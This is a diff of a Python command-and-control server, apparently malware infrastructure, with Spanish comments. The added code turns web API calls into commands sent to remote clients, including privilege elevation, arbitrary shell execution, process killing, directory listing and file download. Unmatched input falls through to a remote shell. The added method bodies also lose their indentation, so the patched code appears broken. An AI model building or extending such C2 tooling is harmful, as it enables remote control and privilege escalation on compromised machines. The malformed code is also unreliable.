@@ -110,21 +110,16 @@ class C2Core:
                     print(f"{Colors.RED}[-] ERROR: {e}{Colors.END}")
     
     def send_command(self, client_id, command):
-        if client_id not in self.clients: 
-            return "Client not found"
-        client = self.clients[client_id]
-        if not client.active: 
-            return "Client offline"
-        
-        # 🔴 CORREGIDO: Convertir formato de comando
-        if ' ' in command and '|' not in command:
-            parts = command.split(' ', 1)
-            command = f"{parts[0]}|{parts[1]}"
-            print(f"{Colors.RED}[→] Sending: {command}{Colors.END}")
-        
-        client.send(command)
-        response = client.recv()
-        return response if response else "No response"
+    if client_id not in self.clients: 
+        return "Client not found"
+    client = self.clients[client_id]
+    if not client.active: 
+        return "Client offline"
+    
+    # 📤 ENVIAR EXACTAMENTE LO QUE LLEGA
+    client.send(command)
+    response = client.recv()
+    return response if response else "No response"
 
 class WebHandler(server.BaseHTTPRequestHandler):
     c2 = None
@@ -139,24 +134,47 @@ class WebHandler(server.BaseHTTPRequestHandler):
             self.send_error(404)
     
     def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode()
-        data = json.loads(post_data)
+    content_length = int(self.headers['Content-Length'])
+    post_data = self.rfile.read(content_length).decode()
+    data = json.loads(post_data)
+    
+    if self.path == '/api/command':
+        client_id = data.get('client_id')
+        command = data.get('command')
+        args = data.get('args', '')
         
-        if self.path == '/api/command':
-            client_id = data.get('client_id')
-            command = data.get('command')
-            args = data.get('args', '')
-            
-            # 🔴 CORREGIDO: Formato correcto para el cliente
-            if args:
-                full_cmd = f"{command}|{args}"
-            else:
-                full_cmd = command
-            
-            print(f"{Colors.RED}[→] Command: {full_cmd}{Colors.END}")
-            response = self.c2.send_command(client_id, full_cmd)
-            self.send_json({'response': response})
+        # 🔥 MAPEO DE COMANDOS - FORMATO CORRECTO
+        cmd_map = {
+            'info': 'INFO_FULL',
+            'processes': 'PROCESSES',
+            'elevate': 'ELEVATE',
+            'whoami': 'SHELL whoami',
+            'ipconfig': 'SHELL ipconfig',
+            'calc': 'EXEC calc.exe',
+            'notepad': 'EXEC notepad.exe',
+        }
+        
+        if command in cmd_map:
+            full_cmd = cmd_map[command]
+        elif command == 'shell' and args:
+            full_cmd = f"SHELL {args}"
+        elif command == 'exec' and args:
+            full_cmd = f"EXEC {args}"
+        elif command == 'kill' and args:
+            full_cmd = f"KILL {args}"
+        elif command == 'dir' and args:
+            full_cmd = f"DIR {args}"
+        elif command == 'download' and args:
+            full_cmd = f"DOWNLOAD {args}"
+        elif args:
+            full_cmd = f"SHELL {command} {args}"
+        else:
+            full_cmd = f"SHELL {command}"
+        
+        print(f"{Colors.RED}[→] Sending: {full_cmd}{Colors.END}")
+        response = self.c2.send_command(client_id, full_cmd)
+        self.send_json({'response': response})
+
     
     def send_json(self, obj):
         self.send_response(200)
